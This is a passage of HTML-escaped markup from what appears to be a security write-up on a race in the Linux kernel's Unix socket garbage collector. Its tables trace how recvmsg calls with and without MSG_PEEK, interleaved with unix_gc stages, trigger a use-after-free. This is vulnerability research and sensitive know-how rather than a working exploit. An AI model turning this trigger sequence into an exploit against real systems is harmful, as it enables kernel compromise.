class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;without &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Everyone is happy&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Everyone is happy&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Everyone is happy&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;However, if the second &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;occurs &lt;/span&gt;&lt;span&gt;just after stage &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;1 of the garbage collection process, the UAF is triggered:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4cb3bda9bda9e3eb3317a2b662883e2cb8968cd6\"&gt;&lt;/a&gt;&lt;a id=\"t.18\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Thread 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Thread 1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Thread 2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Call unix_gc&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Stage0: List &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;as garbage candidates.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Increase reference count: &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm.fp = scm_fp_dup(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;(skb).fp);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage0: decrease inflight count from the child of every garbage candidates&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Status after stage 0:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&amp;#x1d6fc;) = 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage1: Start restoring inflight count.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c46\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;without &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;: &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;(skb).fp = NULL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Blocked by &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;spin_lock(&amp;amp;unix_gc_lock)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Stage1: &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scan_inflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;cannot find candidate children from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;. Thus, the inflight count accidentally remains the same.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Stage2: &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;are garbage.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage2: start purging garbage.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span 